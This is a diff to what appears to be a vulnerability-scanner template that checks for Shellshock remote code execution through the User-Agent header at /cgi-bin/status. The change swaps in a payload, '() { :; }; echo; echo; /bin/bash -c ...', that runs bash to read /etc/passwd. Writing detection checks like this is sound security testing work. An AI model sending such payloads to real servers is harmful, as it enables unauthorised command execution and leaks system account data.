@@ -4,11 +4,12 @@ info:
  name: Remote Code Execution Via (User-Agent)
  author: 0xelkomy
  severity: high
+ description: todo
 
 requests:
  - method: GET
    headers:
-    User-Agent: "{ :;}; echo $(</etc/passwd)"
+    User-Agent: "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'"
    path:
     - "{{BaseURL}}/cgi-bin/status"
    matchers:
